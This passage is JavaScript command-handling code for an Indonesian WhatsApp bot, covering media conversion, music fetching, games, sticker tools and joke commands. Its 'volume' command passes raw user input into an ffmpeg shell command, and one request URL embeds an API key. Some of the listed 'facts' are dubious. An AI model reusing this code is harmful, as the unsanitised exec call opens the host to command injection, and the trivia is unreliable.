					reply (mess.wait)
					encmediatiz = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					mediaapwh = await zaki.downloadAndSaveMediaMessage(encmediatiz)
					ran = getRandom('.mp4')
					exec(`ffmpeg -i ${mediaapwh} ${ran}`, (err) => {
						fs.unlinkSync(mediaapwh)
						if (err) return reply('Gagal, pada saat mengkonversi video ke mp3')
						buffer = fs.readFileSync(ran)
						zaki.sendMessage(from, buffer, audio, {mimetype: 'audio/mp4', quoted: mek})
						fs.unlinkSync(ran)
					})
					break                                                  
case 'volume':

					if (!isRegister) return reply(mess.only.daftarB)
					encmediaea = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await zaki.downloadAndSaveMediaMessage(encmediaea)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${media} -filter:a "volume=${args[0]}" ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(media)
						if (err) return reply('Error!')
						hah = fs.readFileSync(ran)
						zaki.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', duration: 999999999, ptt: true, quoted:mek})
						fs.unlinkSync(ran)
					})
				break                                                  
					 case 'tomp4':
					   if (!isRegister) return reply(mess.only.daftarB)
            if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
            ger = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            owgi = await zaki.downloadAndSaveMediaMessage(ger)
            webp2mp4File(owgi).then(res=>{
            sendMediaURL(from,res.result,'Done')
            })
            }else {
            reply('reply stiker')
            }
            fs.unlinkSync(owgi)
            break                                                  
			
			

				case 'ghost':
					
					if (!isRegister) return reply(mess.only.daftarB)			
	                 if (!isQuotedAudio) return reply('reply audio nya om')
					encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await zaki.downloadAndSaveMediaMessage(encmedia)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${media} -filter:a "atempo=1.6,asetrate=3486" ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(media)
						if (err) return reply('Error!')
						ghs = fs.readFileSync(ran)
					zaki.sendMessage(from, ghs, audio, { mimetype: 'audio/mp4', duration: 999999999, ptt: true, quoted: mek })
						fs.unlinkSync(ran)
					    })
				       break                                                  
		      
	             case 'toptt':
	                 if (!isQuotedAudio) return reply('reply audio nya om')
					encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await zaki.downloadAndSaveMediaMessage(encmedia)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${media} ${ran}`, (err) => {
						fs.unlinkSync(media)
						if (err) return reply('Gagal mengkonversi audio ke ptt')
						topt = fs.readFileSync(ran)
					zaki.sendMessage(from, topt, audio, { mimetype: 'audio/mp4', duration: 999999999, ptt: true, quoted: mek })
						})
						await limitAdd(sender)
					    break                                                  
 case 'spotify':

                if (!isRegister) return reply(mess.only.daftarB)

				if (isLimit(sender)) return reply(ind.limitend(pusname))
				
				reply(ind.wait)
                    if (args.length == 0) return reply(`Example: ${prefix + command} https://open.spotify.com/track/0ZEYRVISCaqz5yamWZWzaA`)
                    url = args[0]
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/spotify?apikey=${lolKey}&url=${url}`)
                    get_result = get_result.result
                    ini_txt = `Title : ${get_result.title}\n`
                    ini_txt += `Artists : ${get_result.artists}\n`
                    ini_txt += `Duration : ${get_result.duration}\n`
                    ini_txt += `Popularity : ${get_result.popularity}\n`
                    ini_txt += `Preview : ${get_result.preview_url}\n`
                    thumbnail = await getBuffer(get_result.thumbnail)
                    zaki.sendMessage(from, thumbnail, image, { quoted: mek, caption: ini_txt })
                    get_audio = await getBuffer(get_result.link[3].link)
                    zaki.sendMessage(from, get_audio, audio, { mimetype: 'audio/mp4', filename: `${get_result.title}.mp3`, quoted: mek })
                    break                                                  
                case 'spotifysearch':
                if (!isRegister) return reply(mess.only.daftarB)
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				
				reply(ind.wait)
                    if (args.length == 0) return reply(`Example: ${prefix + command} Melukis Senja`)
                    query = args.join(" ")
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/spotifysearch?apikey=${lolKey}&query=${query}`)
                    get_result = get_result.result
                    ini_txt = ""
                    for (var x of get_result) {
                        ini_txt += `Title : ${x.title}\n`
                        ini_txt += `Artists : ${x.artists}\n`
                        ini_txt += `Duration : ${x.duration}\n`
                        ini_txt += `Link : ${x.link}\n`
                        ini_txt += `Preview : ${x.preview_url}\n\n\n`
                    }
                    reply(ini_txt)
                    break                                                  

                          case 'playmp3':
      case 'play':
      case 'ytplay':
        if (!isRegister) return reply(mess.only.daftarB)
        if (isLimit(sender)) return reply(ind.limitend(pushname)) 
        await limitAdd(sender)
        if (!q) return reply(`Format salah!\nContoh :\n${prefix}playmp3 sayang`)
        if (!q.endsWith("-doc")) {
          anu = await yts(`${q}`).catch(e => {
            reply('_Error!_')
          })
          reply(ind.wait())
          let thumbInfo = `「  *Youtube Play*  」
◉ *Judul :* ${anu.all[0].title}
◉ *Views :* ${anu.all[0].views}
◉ *Durasi :* ${anu.all[0].timestamp}
◉ *ID :* ${anu.all[0].videoId}

[WAIT] Proses Dumlu Yakan...`
          infoplay = await getBuffer(anu.all[0].image)
          zaki.sendMessage(from, infoplay, image, {
            quoted: mek,
            caption: thumbInfo
          })
          anu = await y2mateA(anu.all[0].url).catch(e => {
            reply('_Error!_')
          })
          playnya = await getBuffer(anu[0].link)
          zaki.sendMessage(from, playnya, document, {
            mimetype: 'audio/mp4',
            filename: `${anu[0].output}`,
            quoted: mek
          })
        }
        if (q.endsWith("-doc")) {
          const aca = q.split("-doc")
          anu = await yts(`${aca}`).catch(e => {
            reply('_Error!_')
          })
          reply(ind.wait())
          let thumbInfo = `\`\`\`「 Youtube Play 」\`\`\`
				
◉ *Judul :* ${anu.all[0].title}
◉ *Views :* ${anu.all[0].views}
◉ *Durasi :* ${anu.all[0].timestamp}
◉ *ID :* ${anu.all[0].videoId}

[WAIT] Proses Dumlu Yakan...`
          infoplay = await getBuffer(anu.all[0].image)
          zaki.sendMessage(from, infoplay, image, {
            quoted: mek,
            caption: thumbInfo
          })
          anu = await y2mateA(anu.all[0].url).catch(e => {
            reply('_Error!_')
          })
          playnya = await getBuffer(anu[0].link)
          zaki.sendMessage(from, playnya, document, {
            mimetype: 'audio/mp4',
            filename: `${anu[0].output}`,
            quoted: mek
          })
        }
        break                                                  
case 'playvideo':   
	          if (!isRegister) return reply(mess.only.daftarB)

            if (isLimit(sender)) return reply(ind.limitend(pushname))
                reply (mess.wait)
                play = body.slice(5)
                anu = await fetchJson(`https://api.zeks.xyz/api/ytplaymp4?apikey=THsoOnDyC18PFI9cDHAHDmJv3if&q=${play}`)
            if (anu.error) return reply(anu.error)
                 infomp4 = `*Video Ditemukan!!!*\nJudul : ${anu.result.title}\nUkuran : ${anu.result.size}\n\n  *_TUNGGU SEBENTAR LAGI DIKIRIM MOHON JANGAN SPAM YA_* `
                buffer = await getBuffer(anu.result.thumbnail)
                lagu = await getBuffer(anu.result.url_video)
                zaki.sendMessage(from, buffer, image, {quoted: mek, caption: infomp4})
                zaki.sendMessage(from, lagu, video, {mimetype: 'video/mp4', filename: `video.mp4`, quoted: mek})
                await limitAdd(sender)
                break                                                  
                     case 'infocuaca':
                   case 'cuaca':  
                   if (!isRegister) return reply(mess.only.daftarB)	 
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} makassar*`)  
                   reply (mess.wait)
                   F = body.slice(7)
                   anu = await fetchJson(`https://docs-jojo.herokuapp.com/api/cuaca?q=${F}`)
                   anu1 = `➻ *TEMPAT* : ${anu.result.tempat}\n`
                   anu1 += `➻ *CUAXA* : ${anu.result.cuaca}\n`
                   anu1 += `➻ *DESK* : ${anu.result.desk}\n` 
                   anu1 += `➻ *SUHU* : ${anu.result.suhu}\n`
                   anu1 += `➻ *KELEBAPAN* : ${anu.result.kelembapan}\n` 
                   anu1 += `➻ *UDARA* : ${anu.result.udara}\n`
                   anu1 += `➻ *ANGIN* : ${anu.result.angin}\n` 
                   reply(anu1)
                   break                                                   
                              case 'tebakkata':
					anu = await fetchJson(`https://leyscoders-api.herokuapp.com/api/tebak-kata?apikey=OneDayOneCharity`, {method: 'get'})
                                        if (!isRegister) return reply(mess.only.daftarB)
                   if (isLimit(sender)) return reply(ind.limitend(pushname))
					setTimeout( () => {
					zaki.sendMessage(from, '*➪︎ jawaban :* '+anu.result.jawaban+'\n'+anu.result.desk, text, {quoted: mek}) // ur cods
					}, 30000) // 1000 = 1s,
					setTimeout( () => {
					zaki.sendMessage(from, '_10 Detik lagi_', text) // ur cods
					}, 20000) // 1000 = 1s,
					setTimeout( () => {
					zaki.sendMessage(from, '_20 Detik lagi_', text) // ur cods
					}, 10000) // 1000 = 1s,
					setTimeout( () => {
					zaki.sendMessage(from, '_30 Detik lagi_', text) // ur cods
					}, 1000) // 1000 = 1s,
					setTimeout( () => {
					zaki.sendMessage(from, anu.result.soal, text, { quoted: mek }) // ur cods
					}, 0) // 1000 = 1s,
					break                                                  
case 'xox':

					if (!isRegister) return reply(mess.only.daftarB)
            const somtoyy = sotoyy[Math.floor(Math.random() * sotoyy.length)]
            zaki.sendMessage(from, `[  🎰 | X O X ]\n-----------------\n\n*${somtoyy}*\n\n-----------------\n[  🎰 | XOX ]\n\nKeterangan : Jika anda Mendapatkan Huruf O 3 Huruf Berarti Anda Menang\n\nContoh : O : O : O<=====`, MessageType.text, { quoted: mek })
            break                                                  
            case 'slot':
            case 'slots':
           if (!isRegister) return reply(mess.only.daftarB)
					
            const somtoy = sotoy[Math.floor(Math.random() * sotoy.length)]
            zaki.sendMessage(from, `[  🎰 | SLOTS ]\n-----------------\n🍋 : 🍌 : 🍍\n${somtoy}<=====\n🍋 : 🍌 : 🍍\n[  🎰 | SLOTS ]\n\nKeterangan : Jika anda Mendapatkan 3Buah Sama Berarti Anda Menang\n\nContoh : 🍌 : 🍌 : 🍌<=====`, MessageType.text, { quoted: mek })
            break                              
            
            case 'tictactoe': 
            case 'ttt': 
            case 'ttc':
                if (!isGroup) return reply(mess.only.group)
                if (isLimit(sender)) return reply(ind.limitend(pushname))
                if (isTicTacToe(from, tictactoe)) return reply(`Masih ada game yg blum selesai`)
                if (args.length < 2) return reply(`Kirim perintah *${prefix}tictactoe* @tag`)
                if (mentioned.length !== 0){
						if (mentioned[0] === sender) return reply(`Sad amat main ama diri sendiri`)
                        let h = randomNomor(100)
                        mentions(monospace(`@${sender.split('@')[0]} menantang @${mentioned[0].split('@')[0]} untuk bermain TicTacToe\n\nKirim (Y/T) untuk bermain\n\nHadiah : ${h} balance`), [sender, mentioned[0]], false)
                        tictactoe.push({
                            id: from,
                            status: null,
                            hadiah: h,
                            penantang: sender,
                            ditantang: mentioned[0],
                            TicTacToe: ['1️⃣','2️⃣','3️⃣','4️⃣','5️⃣','6️⃣','7️⃣','8️⃣','9️⃣']
                        })
                        gameAdd(sender, glimit)
                } else {
                    reply(`Kirim perintah *${prefix}tictactoe* @tag`)
                }
                break
            case 'delttt':
            case 'delttc':
                if (!isGroup) return reply(mess.only.group)
                if (!isTicTacToe(from, tictactoe)) return reply(`Tidak ada sesi game tictactoe di grup ini`)
                tictactoe.splice(getPosTic(from, tictactoe), 1)
                reply(`Berhasil menghapus sesi tictactoe di grup ini`)
                break
            
case 'tebakgambar':
				if (!isRegister) return reply(mess.only.daftarB)

                   if (isLimit(sender)) return reply(ind.limitend(pushname))
					
                    if (tebakgambar.hasOwnProperty(sender.split('@')[0])) return reply("Jawab terlebih dahulu pertanyaan sebelumnya")
                    anu = await fetchJson(`http://zekais-api.herokuapp.com/tebakgambar`)
                    ini_image = anu.soal
                    jawaban = anu.jawaban
                    tebakgambar[sender.split('@')[0]] = jawaban.toLowerCase()
                    fs.writeFileSync("./database/json/tebakgambar.json", JSON.stringify(tebakgambar))
                    console.log(jawaban)
                    ini_buffer = await getBuffer(ini_image)
                    zaki.sendMessage(from, ini_buffer, image, { quoted: mek, caption: "_Jawab pertanyaan berikut!_\nBatas waktu 50detik" })
                    await sleep(50000)
                    if (tebakgambar.hasOwnProperty(sender.split('@')[0])) {
                        reply("Jawaban: " + jawaban)
                        delete tebakgambar[sender.split('@')[0]]
                        fs.writeFileSync("./database/json/tebakgambar.json", JSON.stringify(tebakgambar))
                    }
                    await limitAdd(sender)
                    break                                                    
				case 'suit':  
                    if (!isRegister) return reply(mess.only.daftarB)	
                    F = body.slice(6)
                    if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} batu`)
                    anu = await fetchJson(`https://api.xteam.xyz/game/suit?q=${F}&APIKEY=${apixteam}`)
                    anu1 = `➻ *KAMU* : ${anu.jawabanmu}\n`
                    anu1 += `➻ *BOT* : ${anu.jawabanbot}\n`
                    anu1 += `➻ *HASIL* : ${anu.hasil}\n`
                    anu1 += `➻ *POINT* : ${anu.poin}\n`
                    reply(anu1)
                    break                                                  
                    case 'tebakangka':  
                    if (!isRegister) return reply(mess.only.daftarB)	
                    F = body.slice(12)
                    if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} 9`)
                    anu = await fetchJson(`https://api.xteam.xyz/game/tebakangka?q=${F}&APIKEY=${apixteam}`)
                    anu1 = `➻ *KAMU* : ${anu.jawabanmu}\n`
                    anu1 += `➻ *BOT* : ${anu.jawabanbot}\n`
                    anu1 += `➻ *HASIL* : ${anu.hasil}\n`
                    anu1 += `➻ *POINT* : ${anu.poin}\n`
                    reply(anu1)
                    break                                                  
                    case 'tebakbendera':  
                    if (!isRegister) return reply(mess.only.daftarB)	
                    anu = await fetchJson(`https://api.xteam.xyz/game/tebakbendera?APIKEY=${apixteam}`)
                    anu1 = `➻ *SOAL* : INI BENDERA APA?? ${anu.bendera} TEBAK!! WAKTU 60 DETIK`
                    anu2 = `➻ *JAWABAN* : ${anu.jawaban} SELAMAT YG TELAH MENJAWAB BENAR`
                    setTimeout( () => {
                    zaki.sendMessage(from, anu1, text, {quoted: mek})
                    }, 1)
                    setTimeout( () => {
                    costum('50 DETIK LAGI', text, tescuk, cr)
                    }, 10000)                                                                                                                                   
                    setTimeout( () => {
                    costum('40 DETIK LAGI', text, tescuk, cr)
                    }, 20000)    
                    setTimeout( () => {
                    costum('30 DETIK LAGI', text, tescuk, cr)
                    }, 30000)    
                    setTimeout( () => {
                    costum('20 DETIK LAGI', text, tescuk, cr)
                    }, 40000)                                       
                    setTimeout( () => {
                    costum('10 DETIK LAGI', text, tescuk, cr)
                    }, 50000)                                                                                                                                                     
                    setTimeout( () => {
                    zaki.sendMessage(from, anu2, text,{quoted: mek})                   
                    }, 60000)                                                                          
                    break                                                        
          
                                case 'welcome':

					if (!isGroup) return fakeimage(mess.only.group)

          if (!isRegister) return reply(mess.only.daftarB)
					if (!isGroupAdmins) return reply(mess.only.Badmin)
					if (args.length < 1) return reply('ketik 1 untuk mengaktifkan')
					if (Number(args[0]) === 1) {
						if (isWelkom) return reply('fitur sudah aktif')
						welkom.push(from)
						fs.writeFileSync('./database/json/welkom.json', JSON.stringify(welkom))
						reply('「SUCCSESS」­ mengaktifkan fitur welcome di group ini')
					} else if (Number(args[0]) === 0) {
						welkom.splice(from)
						fs.writeFileSync('./database/json/welkom.json', JSON.stringify(welkom))
						reply('*「SUCCSESS」­ menonaktifkan fitur welcome di group ini*')
					} else {
						reply('ketik 1 untuk mengaktifkan, 0 untuk menonaktifkan fitur')
					}
          break                                                  
	case 'swm':
			case 'stickerwm':
				if (isMedia && !mek.message.videoMessage || isQuotedImage) {
					if (!arg.includes('|')) return reply(from, `Kirim gambar atau reply gambar dengan caption *${prefix}stickerwm nama|author*`, mek)
					const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
					const media = await zaki.downloadAndSaveMediaMessage(encmedia, `./temp/sticker/${sender}`)
					const packname1 = arg.split('|')[0]
					const author1 = arg.split('|')[1]
					exif.create(packname1, author1, `stickwm_${sender}`)
					await ffmpeg(`${media}`)
							.input(media)
							.on('start', function (cmd) {
								console.log(`Started : ${cmd}`)
							})
							.on('error', function (err) {
								console.log(`Error : ${err}`)
								fs.unlinkSync(media)
								reply(mess.ferr)
							})
							.on('end', function () {
								console.log('Finish')
								exec(`webpmux -set exif ./temp/sticker/stickwm_${sender}.exif ./temp/sticker/${sender}.webp -o ./temp/sticker/${sender}.webp`, async (error) => {
									if (error) return reply(mess.ferr)
									zaki.sendSticker(from, fs.readFileSync(`./temp/sticker/${sender}.webp`), mek)
									fs.unlinkSync(media)	
									fs.unlinkSync(`./temp/sticker/${sender}.webp`)	
									fs.unlinkSync(`./temp/sticker/stickwm_${sender}.exif`)
								})
							})
							.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
							.toFormat('webp')
							.save(`./temp/sticker/${sender}.webp`)
				} else if ((isMedia && mek.message.videoMessage.fileLength < 10000000 || isQuotedVideo && mek.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.fileLength < 10000000)) {
					if (!arg.includes('|')) return reply(from, `Kirim gambar atau reply gambar dengan caption *${prefix}stickerwm nama|author*`, mek)
					const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
					const media = await zaki.downloadAndSaveMediaMessage(encmedia, `./temp/sticker/${sender}`)
					const packname1 = arg.split('|')[0]
					const author1 = arg.split('|')[1]
					exif.create(packname1, author1, `stickwm_${sender}`)
					reply(from, mess.wait, mek)
						await ffmpeg(`${media}`)
							.inputFormat(media.split('.')[4])
							.on('start', function (cmd) {
								console.log(`Started : ${cmd}`)
							})
							.on('error', function (err) {
								console.log(`Error : ${err}`)
								fs.unlinkSync(media)
								tipe = media.endsWith('.mp4') ? 'video' : 'gif'
								reply(mess.ferr)
							})
							.on('end', function () {
								console.log('Finish')
								exec(`webpmux -set exif ./temp/sticker/stickwm_${sender}.exif ./temp/sticker/${sender}.webp -o ./temp/sticker/${sender}.webp`, async (error) => {
									if (error) return reply(mess.ferr)
									zaki.sendSticker(from, fs.readFileSync(`./temp/sticker/${sender}.webp`), mek)									
									fs.unlinkSync(media)
									fs.unlinkSync(`./temp/sticker/${sender}.webp`)
									fs.unlinkSync(`./temp/sticker/stickwm_${sender}.exif`)
								})
							})
							.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
							.toFormat('webp')
							.save(`./temp/sticker/${sender}.webp`)
				} else {
					reply(from, `Kirim gambar/video dengan caption ${prefix}stickerwm nama|author atau tag gambar/video yang sudah dikirim\nNote : Durasi video maximal 10 detik`, id)
				}
				break                                                  
				case 'takestick':
		if (!isRegister) return reply(mess.only.daftarB)
                    if ((isMedia && !lol.message.videoMessage || isQuotedSticker)) {
                        if (args.length == 0) return reply(`Example: ${prefix + command} Hlx|Bot`)
                        const dfencmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
                        filePath = await zaki.downloadAndSaveMediaMessage(dfencmedia, filename = getRandom());
                        file_name = getRandom(".webp")
                        ini_txt = args.join(" ").split("|")
                        request({
                            url: `http://api.lolhuman.xyz/api/convert/towebpauthor?apikey=${lolKey}`,
                            method: 'POST',
                            formData: {
                                "img": fs.createReadStream(filePath),
                                "package": ini_txt[0],
                                "author": ini_txt[1]
                            },
                            encoding: "binary"
                        }, function(error, response, body) {
                            fs.unlinkSync(filePath)
                            fs.writeFileSync(file_name, body, "binary")
                            ini_buff = fs.readFileSync(file_name)
                            zaki.sendMessage(from, ini_buff, sticker, { quoted: mek })
                            fs.unlinkSync(file_name)
                        });
                    } else {
                        reply(`Kirim gambar dengan caption ${prefix + command} atau tag gambar yang sudah dikirim`)
                    }
                    break                                                  
		 case 'colong':
      case 'maling':
        if (!isOwner) return reply(ind.ownerb())
        if (!isQuotedSticker) return reply('Tag Stickernya')
        const encmediia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
        const meidia = await zaki.downloadAndSaveMediaMessage(encmediia, `./temp/sticker/${sender}`)
        exec(`webpmux -set exif ./sticker/data.exif ./temp/sticker/${sender}.webp -o ./temp/sticker/${sender}.webp`, async (error) => {
          if (error) return reply('Error Sistem')
          zaki.sendMessage(from, fs.readFileSync(`./temp/sticker/${sender}.webp`), sticker, mek)
          fs.unlinkSync(meidia)
        })
        break                                                   
                                case 'fakta':
					fakta = body.slice(1)
                                        if (!isRegister) return reply(mess.only.daftarB)
                                        if (isLimit(sender)) return reply(ind.limitend(pushname))
					const fakta =['Massa bumi mencapai 5.972.190.000.000.000.000.000.000 kg. Mesekipun sedemikian berat, faktanya bumi memiliki kecepatan 107.281 km per jam untuk mengitari matahari. Cepat sekali, bukan?','Massa berat bumi didominasi debu-debu antariksa dan dapat berkurang akibat gas seperti hidrogen yang berkurang tiga kilogram setiap detiknya. Fakta unik ini menunjukkan bahwa bumi akan kehilangan 95 ribu ton massa setiap tahunnya','Pada 2018 populasi manusia diperkirakan mencapai 7,6 miliar orang. Meskipun bumi dipenuhi manusia, fakta unik mengungkapkan bahwa manusia tidak memengaruhi massa bumi. Hal ini dikarenakan manusia terbentuk dari atom dalam bentuk oksigen 65 persen, karbon 18,5 persen, dan hidrogen 9,5 persen.','bumi dipenuhi oleh 70 persen air sehingga kerap wajar jika bumi disebut dengan nama planet air. Lautan bumi yang paling dalam adalah Palung Mariana dengan kedalaman 10.994 meter di bawah air. Fakta unik dibalik Palung Mariana adalah jika kamu meletakkan Gunung Everest di sana, puncak tertingginya bahkan masih berada di bawah permukaan laut sejauh 1,6 kilometer!','Faktanya bumi yang manusia tinggali hanya satu persen bagian dari keseluruhan planet bumi. Fakta unik ini menunjukkan bahwa masih banyak bagian bumi yang memiliki misteri kehidupan. Tertarik melakukan penjelajahan untuk menguak misteri sekaligus fakta unik di bagian bumi lainnya','Terdapat sebuah kota di Rusia yang jalanannya tertata rapi dengan sebuah istana yang didesain seperti catur yang megah. Pembuatan pemukiman tersebut didalangi oleh presiden yang terobsesi dengan catur bernama Kirsan Ilyumzhinov.','Apakah kamu tahu fakta unik mengenai mozzarella yang dibuat dari susu kerbau dan bukan susu sapi? Sekitar 500 tahun yang lalu di Campania, Italia, mozzarella dibuat pertama kali menggunakan susu kerbau. Fakta unik dibalik penggunaan susu kerbau ini karena kandungan protein susu kerbau 10-11% lebih banyak daripada susu sapi.','Bali memiliki fakta unik karena memliki banyak hari libur yang disumbangkan oleh sejumlah hari raya besar keagamaan. Hampir setiap hari besar keagamaan ini setiap orang akan mendapatkan libur. Beberapa hai libur diantaranya adalah hari raya galungan, kuningan, nyepi, pagerwesi, saraswati, dan sejumlah upacara besar lainnya seperti piodalan (pujawali).','Ibukota Jakarta memiliki banyak pesona juga fakta unik yang mungkin belum kamu ketahui. Sebelum diberi nama Jakarta, Ibukota indonesia ini telah memiliki beberapa kali perubahan nama. Nama Ibukota indonesia sesuai urutan perubahannya diantaranya adalah Sunda Kelapa, Jayakarta, Batavia, Betawi, Jacatra, Jayakarta, dan Jakarta.','Pada tahun 1952 jendela pesawat didesain dalam bentuk persegi namun penggunaannya dinilai cacat sehingga tidak  diterapkan kembali. Jendela yang bulat dirancang untuk menyiasati perbedaan tekanan udara dalam dan luar pesawat untuk menghindari kegagalan struktural yang dapat menyebabkan kecelakaan pesawat.','Makanan utama dari nyamuk jantan dan betina pada umumnya adalah nektar dan zat manis yang sebagian besar diperoleh dari tanaman. Namun nyamuk membutuhkan protein tambahan unuk bertelur yang bisa didapatkan dari manusia sedangkan nyamuk jantan tidak membutuhkan zat protein tambahan untuk bertelur.','Jembatan suramadu (surabaya-madura) adalah jembatan terpanjang di Asia Tenggara (5438 m).','Tertawa dan bahagia meningkatkan imun, terutama produksi sel-sel pembunuh alamiah yang membantu melindungi tubuh dari penyakit','Kecoa kentut setiap 15 menit dan terus mengeluarkan gas metana (kentut) selama 18 jam setelah kematian.','Mengoleskan jeruk nipis dapat mencerahkan bagian lutut / siku yang hitam.','Energi yang dihasilkan oleh angin ribut (topan) selama 10 menit lebih besar dibandingkan energi dari bom saat perang','Satu-satunya indera manusia yang tidak berfungsi saat tidur adalah indera penciuman.','Para astronot dilarang makan makanan berjenis kacang-kacangan sebelum pergi ke luar angkasa. Karena bisa menyebabkan mereka mudah kentut. Dan gas kentut sangat membahayakan bagi baju luar angkasa mereka.','Di AS saja, kucing membunuh miliaran hewan dalam kurun waktu setahun. Mereka bertanggung jawab atas kematian 1,4 - 73,7 miliar burung dan 6,9 - 20,7 miliar mamalia setiap tahun. Bukan hanya itu, sejauh ini mereka benar-benar memusnahkan total 33 spesies dari dunia.','Ikan hiu kehilangan gigi lebih dari 6000buah setiap tahun, dan gigi barunya tumbuh dalam waktu 24 jam.','Semut dapat mengangkat Beban 50 kali tubuhnya.','Mulut menghasilkan 1 liter ludah setiap hari.','Siput bisa tidur selama 3 tahun','Kecoak bisa hidup 9 hari tanpa kepala, dan akan mati karena kelaparan','Mata burung unta lebih besar dari otaknya']
					const keh = fakta[Math.floor(Math.random() * fakta.length)]
					zaki.sendMessage(from, 'fakta : '+ keh, { quoted: mek })
                                        await limitAdd(sender)
					break                                                  
                                case 'water':
					if (args.length < 1) return reply(mess.blank)
                                        if (!isRegister) return reply(mess.only.daftarB)
                                        if (isLimit(sender)) return reply(ind.limitend(pushname))
					tels = body.slice(7)
					if (tels.length > 15) return reply('Teksnya kepanjangan, maksimal 20 karakter')
					reply (mess.wait)
					anu = await fetchJson(`https://kocakz.herokuapp.com/api/flamingtext/water?text=${tels}`, {method: 'get'})
					buffer = await getBuffer(anu.result)
					zaki.sendMessage(from, buffer, image, {quoted: mek})
                                        await limitAdd(sender)
					break                                                  
//KERANGMENU
                                case 'gantengcek':
					if (!isRegister) return reply(mess.only.daftarB)
                                        if (isLimit(sender)) return reply(ind.limitend(pushname))
					ganteng = body.slice(1)
					const gan =['10','30','20','40','50','60','70','62','74','83','97','100','29','94','75','82','41','39']
					const teng = gan[Math.floor(Math.random() * gan.length)]
					zaki.sendMessage(from, 'Pertanyaan : *'+ganteng+'*\n\nJawaban : '+ teng+'%', text, { quoted: mek })
					break                                                  
					case 'cantikcek':
					if (!isRegister) return reply(mess.only.daftarB)
                                        if (isLimit(sender)) return reply(ind.limitend(pushname))
					cantik = body.slice(1)
					const can =['10','30','20','40','50','60','70','62','74','83','97','100','29','94','75','82','41','39']
					const tik = can[Math.floor(Math.random() * can.length)]
					zaki.sendMessage(from, 'Pertanyaan : *'+cantik+'*\n\nJawaban : '+ tik+'%', text, { quoted: mek })
					break                                                  
				case 'watak':
				if (isRegister) return reply(mess.only.daftarB)
         if (isLimit(sender)) return reply(ind.limitend(pushname))
					watak = body.slice(1)
					const wa =['peny ayang','pem urah','Pem arah','Pem aaf','Pen urut','Ba ik','bap eran','Baik Hati','peny abar','Uw u','top deh, poko knya','Suka Memb antu']
					const tak = wa[Math.floor(Math.random() * wa.length)]
					zaki.sendMessage(from, 'Pertanyaan : *'+watak+'*\n\nJawaban : '+ tak, text, { quoted: mek })
                                        await limitAdd(sender)
				    break                                                  
				case 'hobby':
				if (!isRegister) return reply(mess.only.daftarB)
                                        if (isLimit(sender)) return reply(ind.limitend(pushname))
					hobby = body.slice(1)
					const hob =['Memasak','Membantu Atok','Mabar','Nobar','Sosmedtan','Membantu Orang lain','Nonton Anime','Nonton Drakor','Naik Motor','Nyanyi','Menari','Bertumbuk','Menggambar','Foto fotoan Ga jelas','Maen Game','Berbicara Sendiri']
					const by = hob[Math.floor(Math.random() * hob.length)]
					zaki.sendMessage(from, 'Pertanyaan : *'+hobby+'*\n\nJawaban : '+ by, text, { quoted: mek })
					break                                                  
case 'jelekcek':  
                    if (!isRegister) return reply(mess.only.daftarB)                      	
                    N = `KE *J3L3K4N* KAMU\n`
                    N += `ADALAH : *${zaki3}${zaki4}%* 🤢`
                    reply(N)
                    break                                                   
                    case 'goblokcek':                      	  
                    if (!isRegister) return reply(mess.only.daftarB)
                    N = `KE *GOBLOKAN* KAMU\n`
                    N += `ADALAH : *${zaki3}${zaki4}%* 🤣`
                    reply(N)
                    break                                                   
                    case 'begocek':                      	  
                    if (!isRegister) return reply(mess.only.daftarB)
                    N = `KE *BEGO* KAMU\n`
                    N += `ADALAH : *${zaki3}${zaki4}%* 😂`
                    reply(N)
                    break                                                   
                    case 'pintercek':                      	  
                    if (!isRegister) return reply(mess.only.daftarB) 
                    N = `KE *PINTARAN* KAMU\n`
                    N += `ADALAH : *${zaki3}${zaki4}%* 😗`
                    reply(N)
                    break                                                   
                    case 'jagocek':                      	  
                    if (!isRegister) return reply(mess.only.daftarB) 
                    N = `KE *JAGOAN* KAMU\n`
                    N += `ADALAH : *${zaki3}${zaki4}%* 💪`
                    reply(N)
                    break                                                   
                    case 'nolepcek':                      	  
                    if (!isRegister) return reply(mess.only.daftarB) 
                    N = `KE *NOLEPAN* KAMU\n`
                    N += `ADALAH : *${zaki3}${zaki4}%* 🧐`
                    reply(N)
                    break                                                   
                    case 'babicek':                      	  
